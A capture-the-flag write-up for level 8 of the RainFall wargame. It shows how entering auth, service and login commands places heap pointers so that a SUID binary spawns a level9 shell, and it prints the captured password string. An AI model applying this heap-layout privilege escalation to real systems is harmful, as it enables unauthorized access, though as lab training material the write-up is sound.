# Level 8

## Vulnerability

Idiocy

## Context

We find a binary with owner level9 and SUID.
```
level8@RainFall:~$ ls -l
-rwsr-s---+ 1 level9 users 6057 Mar  6  2016 level8
```
When run accepts input on stdin and prints 2 null values.
```
level8@RainFall:~$ ./level8
(nil), (nil)
wait... what?
(nil), (nil)
```

## Solution

Investigating with gdb, we find the main reads stdin with fgets() accepting commands.

It calls system("/bin/sh") after several conditional jumps.
```
level8@RainFall:~$ gdb -q level8
...
(gdb) disas main
...
   0x080485ae <+74>:	call   0x8048440 <fgets@plt>
...
   0x080486f5 <+401>:	call   0x8048480 <system@plt>
```
if we cat the binary we find some strings that look like commands
```
level8@RainFall:~$ cat level8
...
auth resetservicelogin/bin/shPassword:
```
Playing with these commands as input to ```level8``` we find the following:

* ```auth```    : calls ```strcpy()```, copies input following auth into global variable ```auth```.
* ```service``` : calls ```strdup()```, copies input following service into global variable ```service```.
* ```reset```   : calls ```free()```, resets global variable auth.
* ```login```   : If auth[32] is non-zero call ```system()```. Else ```fwrite()``` displays address of global variables ```auth``` and ```service```.

malloc() places each pointer successively on the heap, with some padding. In this case we see 16 bytes between pointers.

To make auth[32] non-zero we can attempt to place our ```service``` variable 32 bytes after ```auth``` on the heap.

Create the first pointer with command ```auth```, then a second calling ```service``` twice. We see ```service``` is now exactly 32 bytes after ```auth```.

So when we call login auth[32] is non-zero and we are given a new shell as user ```level9``` where we can ```cat``` the password.
```
level8@RainFall:~$ ./level8
(nil), (nil)
auth please
0x804a008, (nil)
service
0x804a008, 0x804a018
service
0x804a008, 0x804a028
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
### Alternative solution

Alternatively, create the ```auth``` pointer first, then a second calling ```service``` with any string at least 16 bytes long.
```
auth I mean...
0x804a008, (nil)
service0123456789abcdef
0x804a008, 0x804a018
login
$ whoami
level9
```

## Recreate Exploited Binary

As user ```level9```, in ```/tmp```, create and compile ```level8_source.c```
```
level9@RainFall:/tmp$ gcc level8_source.c -o level8_source
```
Edit permissions including suid, then move the binary to home directory.
```
level9@RainFall:/tmp$ chmod u+s level8_source; chmod +wx ~; mv level8_source ~
```
Exit back to user ```level8```, then run the source.
```
level9@RainFall:/tmp$ exit
exit
level8@RainFall:~$ /home/user/level9/level8_source
(nil), (nil)
auth please
0x804a008, (nil)
service0123456789abcdef
0x804a008, 0x804a018
login
$ whoami
level9
```
